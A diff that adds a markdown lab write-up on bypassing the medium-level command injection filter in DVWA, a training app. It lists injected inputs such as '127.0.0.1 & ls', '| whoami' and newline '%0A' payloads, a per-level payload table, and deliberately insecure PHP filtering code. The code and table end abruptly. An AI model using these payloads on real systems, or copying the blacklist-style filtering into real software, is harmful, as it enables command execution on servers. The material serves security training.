@@ -1,0 +1,61 @@
+
+## **📂 DVWA/Command-Injection/medium-security.md**
+```markdown
+# 🛡️ Medium Security - Command Injection
+
+## 🎯 Test Case
+**Target:** Same ping functionality with basic filtering
+
+## 🔧 Filter Analysis
+The application blocks certain characters:
+- Blocks: `;` (semicolon)
+- Allows: `&`, `|`, `&&`, `||`
+
+## ⚡ Bypass Techniques
+
+### 1. Using Ampersand (&)
+
+Input: 127.0.0.1 & ls
+Command: ping 127.0.0.1 & ls
+Result: Both commands execute
+
+
+### 2. Using Pipe (|)
+
+Input: 127.0.0.1 | whoami
+Command: ping 127.0.0.1 | whoami
+Result: whoami output (ping output piped)
+
+
+### 3. Using Newline (%0A)
+
+Input: 127.0.0.1%0Als
+Command: ping 127.0.0.1[newline]ls
+Result: Both commands execute
+
+
+## 📊 Payload Comparison
+| Security Level | Blocked Characters | Working Payloads |
+|----------------|-------------------|------------------|
+| Low | None | `; ls`, `&& ls`, `| ls` |
+| Medium | `;` | `& ls`, `%0Als`, `|| ls` |
+| High | `; & |` | Limited options |
+
+## 🔍 Vulnerability Analysis
+- **Filter Bypass:** Incomplete character blacklist
+- **Common Mistake:** Only blocking common separators
+- **Improvement Needed:** Should block ALL command separators
+
+## 🛡️ Better Filtering
+```php
+// STILL INSECURE (DVWA Medium)
+$target = $_REQUEST['ip'];
+$target = str_replace(';', '', $target);
+system("ping -c 4 " . $target);
+
+// BETTER BUT STILL VULNERABLE
+$target = $_REQUEST['ip'];
+$target = str_replace([';', '&', '|'], '', $target);
+// Still vulnerable to: 127.0.0.1%0Als
+
+![Description](Command-Security/medium secuiryt 1.png)
